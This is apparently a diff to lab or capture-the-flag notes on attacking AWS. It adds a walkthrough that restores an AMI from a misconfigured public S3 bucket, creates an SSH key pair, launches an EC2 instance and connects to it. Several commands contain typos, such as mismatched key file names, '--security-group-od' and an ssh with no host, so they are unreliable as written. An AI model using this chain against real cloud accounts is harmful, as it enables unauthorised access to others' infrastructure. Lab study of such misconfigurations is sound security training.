@@ -172,7 +172,42 @@ aws s3 sync s3://$BUCKET_NAME . --no-sign-request
 
 ### AWS Service Substrate
 - S3 buckets not only host contents for static websites but also store files for other AWS services like AWS CloudFormation Template or Lambda fucntions.Becasue of this, if we see a bucket containg any other resrouces, we can try to modify those files to leverage an attack.
-- 
+
+### Attacking EC2 and S3
+- With the binary found in the above steps, we can generate another image.
+  
+```bash
+aws ec2 create-restore-image-task --object-key $AMI_OBJECT_ID --bucket assets.bestcloudcompany.org --name $UNIQUE_NAME
+```
+- Create AWS-generated SSH key pare and store it on the attacking machine
+
+```bash
+aws ec2 create-key-pair --key-name $KEY_NAME --query "KeyMaterial" --output text > ~/.ssh/keypair.pem
+```
+
+- Create a subnet to deploy the instance
+
+```bash
+aws ec2 describe-subnets
+```
+- To laucnh an EC2 instance from the genetrated AMI above, we neee a security group that allows SSH access
+
+```bash
+aws ec2 describe-security-groups
+```
+
+- Use the security group ID to launch EC2 instance
+
+```bash
+aws ec2 run-instances --image-id $IMAGE_ID --instance-type t3a.micro --key-name kepari.pem --subnet-id $SUBNET_ID --security-group-od $SECURITY_GROUP_ID
+```
+
+- ssh into the machine
+
+```bash
+ssh -i keyoair.pem
+```
+
 
 # ANSWER THE QUESTIONS
 - **What is the name of the file storage container where you keep your data in S3?**
